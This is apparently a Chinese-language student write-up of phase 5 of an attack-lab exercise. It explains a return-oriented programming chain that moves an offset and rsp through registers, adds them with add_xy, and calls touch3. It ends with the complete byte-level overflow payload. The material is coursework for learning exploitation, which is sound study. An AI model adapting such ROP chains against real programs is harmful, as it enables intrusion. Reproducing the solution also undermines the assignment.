# phase5解题思路

## 思路整理
- phase5的难点在于，不能像phase3那样自己构造代码，且栈被随机化了
- 但是由于需要引用栈上存储cookie的具体位置，所以必定需要rsp这个值
- 但是rsp这个值肯定不会直接指向我们存放cookie的位置，所以需要一个额外的offset
- 后面的思路就很明确了，最终需要的值就是rsp+offset
    - 取出rsp的值
    - 设定offset的值
    - 确保rsp和offset能相加
    - 将结果存放在rdi中
    - 调用touch3
- 思路是从上往下的，而需要的结果则是从下往上推
    - farm中提供了add_xy函数，所以可以确保rsp和offset能进行相加
    - 只需要将rsp的值存入rdi，将offset的值存入rsi中，即可进行正确的运算

**1.将offset的值存入rsi**
- 这个过程比较绕，没有直接将pop后，直接将值存入rsi的操作
- 所以需要经过多轮的操作（下列操作其实本身不是64位的，真实情况是32位的寄存器操作，但是为了简便，就这么写了）
    - pop rax           0x4019cc
    - mov rax, rdx      0x4019dd
    - mov rdx, rcx      0x401a34
    - mov rcx, rsi      0x401a27
- 整体思路是这样的，只要确定应该在栈中存入offset的具体值即可

**2.将rsp的值存入rdi**
- 这个过程相对1来说容易很多
    - mov rsp, rax      0x401a06
    - mov rax, rdi      0x4019c5

**3.将两个数相加**
- 直接调用add_xy即可
    - ret               0x4019d6

**4.将相加的结果数存入rdi中，并调用touch3**
- mov rax, rdi          0x4019c5
- ret                   0x4018fa

**5.计算offset的具体值，并且存入栈中**
- 根据调用存储rsp的位置与cookie存放位置之间的差值来计算
- offset = 0x20

## 编码展示

**栈溢出位置存放第一个需要调用指令的位置**
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
cc 19 40 00 00 00 00 00 

**取出offset，并且按照rax->rdx->rcx->rsi的寄存器mov移动顺序依次调用指令**
20 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
34 1a 40 00 00 00 00 00 
27 1a 40 00 00 00 00 00 

**将rsp的值存入rdi中，按照rsp->rax->rdi的寄存器mov移动顺序依次调用指令**
06 1a 40 00 00 00 00 00 
c5 19 40 00 00 00 00 00 

**调用add_xy函数**
d6 19 40 00 00 00 00 00 

**将结果值rax存入rdi中，并调用touch3**
c5 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 

**cookie编码**
35 39 62 39 39 37 66 61 
00 00 00 00 00 00 00 00 
